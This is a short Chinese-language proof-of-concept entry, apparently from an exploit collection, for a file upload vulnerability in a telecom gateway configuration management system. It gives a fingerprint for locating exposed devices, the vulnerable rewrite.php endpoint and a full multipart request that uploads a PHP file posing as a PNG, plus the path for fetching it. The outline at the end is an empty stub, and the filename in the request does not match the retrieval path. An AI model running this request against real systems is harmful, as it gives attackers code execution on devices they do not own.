# 电信网关配置管理系统rewrite存在文件上传漏洞

- **系统**：电信网关配置管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="img/dl.gif"`
- **请求**：`POST /manager/teletext/material/rewrite.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT`

**请求体 / payload**
```
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="test.php"
Content-Type: image/png
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
------WebKitFormBoundaryOKldnDPT--

上传文件地址
GET /xmedia/material/test1.php HTTP/1.1
Host:
```

**其他**
- 电信网关配置管理系统rewrite存在文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 电信网关配置管理系统